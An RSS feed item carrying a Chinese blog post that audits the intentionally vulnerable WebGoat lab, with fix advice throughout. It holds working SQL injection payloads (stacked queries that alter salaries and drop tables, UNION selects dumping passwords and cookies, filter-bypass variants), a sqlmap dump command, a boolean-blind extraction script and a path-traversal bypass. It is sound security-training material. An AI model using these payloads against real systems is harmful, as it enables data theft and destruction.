<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>Milkii0的秘密花园 • Posts by &#34;webgoat&#34; tag</title>
        <link>http://example.com</link>
        <description></description>
        <language>en</language>
        <pubDate>Thu, 28 Jan 2021 09:28:50 +0800</pubDate>
        <lastBuildDate>Thu, 28 Jan 2021 09:28:50 +0800</lastBuildDate>
        <category>web,HTTP</category>
        <category>redis,未授权,漏洞利用</category>
        <category>solr, 漏洞复现</category>
        <category>前后端分离</category>
        <category>文件上传靶场</category>
        <category>Java反序列化</category>
        <category>ysoserial调试</category>
        <category>木马,汇总</category>
        <category>pikachu,web靶场</category>
        <category>dorabox,靶场练习</category>
        <category>sql注入靶场</category>
        <category>webgoat</category>
        <category>solr, 代码审计</category>
        <category>CodeQL</category>
        <category>codeql, 搭建教程</category>
        <item>
            <guid isPermalink="true">http://example.com/2021/01/28/webgoat%E5%AE%A1%E8%AE%A1/</guid>
            <title>webgoat审计</title>
            <link>http://example.com/2021/01/28/webgoat%E5%AE%A1%E8%AE%A1/</link>
            <category>webgoat</category>
            <pubDate>Thu, 28 Jan 2021 09:28:50 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;搭建概述&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#搭建概述&#34;&gt;#&lt;/a&gt; 搭建概述&lt;/h1&gt;
&lt;p&gt;前提：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Java 11&lt;/li&gt;
&lt;li&gt;Maven &amp;gt; 3.2.1&lt;/li&gt;
&lt;li&gt;IDEA&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下载源码&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;git clone https://github.com/WebGoat/WebGoat.git&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;打开 idea 导入 maven 项目，build 完成之后，打开 localhost:8080/WebGoat，注册账户&lt;/p&gt;
&lt;h1 id=&#34;sql注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql注入&#34;&gt;#&lt;/a&gt; Sql 注入&lt;/h1&gt;
&lt;p&gt;select department from employees where first_name=‘Bob’&lt;/p&gt;
&lt;p&gt;update employees set department=‘Sales’ where first_name=‘Barnett’&lt;/p&gt;
&lt;p&gt;alter table employees add column phone varchar(20)&lt;/p&gt;
&lt;p&gt;grant alter table to UnauthorizedUser&lt;/p&gt;
&lt;p&gt;12:’; update employees set salary=1000000 where last_name=‘Smith’;–&lt;/p&gt;
&lt;p&gt;13:’; drop table access_log;-- -&lt;/p&gt;
&lt;h2 id=&#34;漏洞描述&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞描述&#34;&gt;#&lt;/a&gt; 漏洞描述&lt;/h2&gt;
&lt;p&gt;当应用程序将用户输入的内容，拼接到 SQL 语句中，一起提交给数据库执行时，就会产生 SQL 注入威胁。攻击者通过控制部分 SQL 语句，可以查询数据库中任何需要的数据，利用数据库的一些特性，甚至可以直接获取数据库服务器的系统权限。&lt;/p&gt;
&lt;h2 id=&#34;漏洞成因&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞成因&#34;&gt;#&lt;/a&gt; 漏洞成因&lt;/h2&gt;
&lt;p&gt;字符拼接的方式拼接 sql 语句，并且没有做任何过滤直接执行&lt;/p&gt;
&lt;h2 id=&#34;代码片段以及修复建议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码片段以及修复建议&#34;&gt;#&lt;/a&gt; 代码片段以及修复建议&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;sql-injection–&amp;gt;SQLInjectionChanllenge&lt;/p&gt;
&lt;p&gt;使用预编译 PrepareStatement，实现数据代码分离&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;sql1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;根据代码找到注入点，用 sqlmap 跑，payload&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sqlmap.py -r 1.txt --method PUT --data &amp;quot;username_reg&amp;quot; -D PUBLIC -T CHALLENGE_USERS -C password --dump&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但是可能由于服务器的原因，跑了很久，还跑错了，密码应该是 thisisasecretfortomonly&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;sql9.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;sql-injection–&amp;gt;SQLInjectionLesson6a&lt;/p&gt;
&lt;p&gt;使用预编译 PrepareStatement，实现数据代码分离&lt;img src=&#34;sql2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;payload (注意字段类型要对应)：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;-1&amp;#x27; union select userid,user_name,password, cookie,&amp;#x27;&amp;#x27;,&amp;#x27;&amp;#x27;,0 from user_system_data --&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;sql8.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;sql-injection–&amp;gt;Servers&lt;/p&gt;
&lt;p&gt;列名不能加双引号，所以只能用字符拼接的方式拼接 sql 语句，建议对列名进行白名单过滤&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@ResponseBody&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; List&amp;lt;Server&amp;gt; &lt;span class=&#34;title&#34;&gt;sort&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;meta&#34;&gt;@RequestParam&lt;/span&gt; String column)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; Exception &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        List&amp;lt;Server&amp;gt; servers = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ArrayList&amp;lt;&amp;gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt; (Connection connection = dataSource.getConnection();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             PreparedStatement preparedStatement = connection.prepareStatement(&lt;span class=&#34;string&#34;&gt;&amp;quot;select id, hostname, ip, mac, status, description from servers  where status &amp;lt;&amp;gt; &amp;#x27;out of order&amp;#x27; order by &amp;quot;&lt;/span&gt; + column)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ResultSet rs = preparedStatement.executeQuery();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (rs.next()) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                Server server = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Server(rs.getString(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;), rs.getString(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;), rs.getString(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;), rs.getString(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;), rs.getString(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;), rs.getString(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                servers.add(server);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; servers;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;sql4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;测试截图:&lt;/p&gt;
&lt;p&gt;sqlmap 不太好使，太慢了，然后就看见大佬写的脚本&lt;/p&gt;
&lt;p&gt;布尔盲注，根据返回数据的排序来判断真假 (tql)&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# -*- coding:utf-8 -*-&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; string &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; digits&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chars = digits+&lt;span class=&#34;string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;headers = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;#x27;X-Requested-With&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;#x27;XMLHttpRequest&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cookies = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;#x27;JSESSIONID&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;#x27;D81iy9aS29fcA8JZUl1QEdeNBahRWoMFk8YyziGj&amp;#x27;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;#x27;JSESSIONID.75fbd09e&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;#x27;7mc1x9iei6ji4xo2a3u4kbz1&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;result = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;proxy=&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;http&amp;quot;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1:6666&amp;quot;&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    i += &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    temp = result&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; char &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; chars:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        vul_url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=case%20when%20(select%20substr(ip,&amp;#123;0&amp;#125;,1)=&amp;#x27;&amp;#123;1&amp;#125;&amp;#x27;%20from%20servers%20where%20hostname=&amp;#x27;webgoat-prd&amp;#x27;)%20then%20hostname%20else%20mac%20end&amp;quot;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(i, char)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        resp = requests.get(vul_url, headers=headers, cookies=cookies, proxies=proxy)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# print(resp.json())&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;webgoat-acc&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; resp.json()[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;hostname&amp;#x27;&lt;/span&gt;]:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            result += char&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(result)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; temp == result:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;select * from table where &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;column = &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;case&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;when (select substr(ip,&amp;#123;0&amp;#125;,1) = &amp;#x27;&amp;#123;1&amp;#125;&amp;#x27; from server where  hostname = &amp;#x27;webgoat-prd&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;then hostname&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;else mac end&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;sql12.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;sql-injection–&amp;gt;SqlOnlyInputValidation&lt;/p&gt;
&lt;p&gt;限制用户输入内容不能包含空格，但是可以通过过 /**/ 注释，括号等绕过，过滤空格后直接调用 SQLInjectionLesson6a 的注入函数（字符拼接执行并直接输出结果），修复建议同 SQLInjectionLesson6a&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;sql5.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;-1&amp;#x27;/**/union/**/select/**/userid,user_name,password,cookie,&amp;#x27;&amp;#x27;,&amp;#x27;&amp;#x27;,0/**/from/**/user_system_data/**/--/**/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;sql10.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;sql-injection–&amp;gt;SqlOnlyInputValidationOnKeywords&lt;/p&gt;
&lt;p&gt;对用户输入进行关键字’select’ &#39;from’进行了一次判断置空，并限制用户输入不能包含空格，可以通过双写 + 注释绕过绕过，建议使用预编译&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;sql6.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;-1&amp;#x27;/**/union/**/selecselectt/**/userid,user_name,password,cookie,&amp;#x27;&amp;#x27;,&amp;#x27;&amp;#x27;,0/**/frfromom/**/user_system_data/**/--/**/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;sql11.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;任意文件上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#任意文件上传&#34;&gt;#&lt;/a&gt; 任意文件上传&lt;/h1&gt;
&lt;h2 id=&#34;漏洞描述-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞描述-2&#34;&gt;#&lt;/a&gt; 漏洞描述&lt;/h2&gt;
&lt;p&gt;文件上传功能允许用户将本地的文件通过 Web 页面提交到网站服务器上，但是如果不对用户上传的文件进行合法性验证，则攻击者可利用 Web 应用系统文件上传功能（如文件上传、图像上传等）的代码缺陷来上传任意文件或者 webshell，并在服务器上运行，以达到获取 Web 应用系统控制权限或其他目的。&lt;/p&gt;
&lt;h2 id=&#34;漏洞成因-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞成因-2&#34;&gt;#&lt;/a&gt; 漏洞成因&lt;/h2&gt;
&lt;p&gt;未对用户输入的参数进行合法性验证&lt;/p&gt;
&lt;h2 id=&#34;代码片段以及修复建议-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码片段以及修复建议-2&#34;&gt;#&lt;/a&gt; 代码片段以及修复建议&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;path-traversal–&amp;gt;ProfileUpload&lt;/p&gt;
&lt;p&gt;获取前端上传的文件以及字符串 “fullName”&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@PostMapping(value = &amp;quot;/PathTraversal/profile-upload&amp;quot;, consumes = ALL_VALUE, produces = APPLICATION_JSON_VALUE)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;meta&#34;&gt;@ResponseBody&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; AttackResult &lt;span class=&#34;title&#34;&gt;uploadFileHandler&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;meta&#34;&gt;@RequestParam(&amp;quot;uploadedFile&amp;quot;)&lt;/span&gt; MultipartFile file, &lt;span class=&#34;meta&#34;&gt;@RequestParam(value = &amp;quot;fullName&amp;quot;, required = false)&lt;/span&gt; String fullName)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;super&lt;/span&gt;.execute(file, fullName);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;调用父类 ProfileUploadBase，execute () 方法，判断文件和 &amp;quot;fullName&amp;quot; 非空后直接上传，并且 “fullName” 用作子路径名字符串&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;sql7.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;修复建议&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;对 fullName 进行判断过滤&lt;/li&gt;
&lt;li&gt;使用适当的权限保护文件夹&lt;/li&gt;
&lt;li&gt;随机化重命名用户上传的文件名&lt;/li&gt;
&lt;li&gt;根据用户上传的文件类型重构文件&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt01.png&#34; alt=&#34;&#34;&gt;&lt;img src=&#34;pt02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;path-traversal–&amp;gt;ProfileUploadFix&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;对 “fullName” 过滤了 “…/”，但是因为 replace 并不能递归检测，所以可以通过双写绕过 (’…/./’)，修复建议同上&lt;/p&gt;
